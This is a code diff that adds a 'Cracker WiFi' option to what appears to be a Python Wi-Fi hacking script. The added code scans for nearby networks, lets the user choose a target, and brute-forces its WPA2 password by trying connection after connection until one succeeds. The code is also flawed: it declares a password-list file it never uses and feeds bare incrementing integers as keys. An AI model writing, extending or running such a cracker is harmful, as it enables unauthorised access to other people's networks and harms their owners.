@@ -146,5 +146,63 @@ elif userInput == "2":
             print(color.GREEN+"PASSWORD : {}".format(password))
             print("-" *30)
             break
+elif userInput == "3":
+    print(color.LIGHTBLUE_EX+"<< Hello WelCome To Cracker WiFi >>")
+
+    def scan(): # For Scan the area
+        interface.scan()
+        sleep(8)
+        result = interface.scan_results()
+        return result
+
+    def testwifi(ssid , password):
+        interface.disconnect()
+        profile = Profile()
+        profile.ssid = ssid
+        profile.auth = const.AUTH_ALG_OPEN
+        profile.akm.append(const.AKM_TYPE_WPA2PSK)
+        profile.cipher = const.CIPHER_TYPE_CCMP
+        profile.key = password
+        interface.connect(interface.add_network_profile(profile))
+        sleep(1)
+        if interface.status() == const.IFACE_CONNECTED:
+            interface.remove_network_profile(profile)
+            return True
+        else:
+            interface.remove_network_profile(profile)
+            return False
+            
+
+    
+    wifi = PyWiFi() # Wifi Object
+    interface = wifi.interfaces()[0] # Select First Wireless Interface CARD
+    print("")
+    print("Test PassWord List Default")
+    sleep(0.1)
+    print("")
+    passlist = "passwordlist.txt"  # Password List File 
+
+    print(color.GREEN+"<<Scanning ... ")
+    APs = scan()
+
+    for i in range(len(APs)):
+        print("{} - {}".format(i+1 ,APs[i].ssid))
+
+    index = int(input("\n>> "))
+    target = APs[index-1]
+
+    password = 0
+    while True:
+        password += 1
+        print(color.RED+"Testing: {}".format(password))
+        if testwifi(target.ssid,password):
+            print("-" *30)
+            print(color.GREEN+"PASSWORD : {}".format(password))
+            print("-" *30)
+            break
+
+
+
+
 else:
     print("cya")
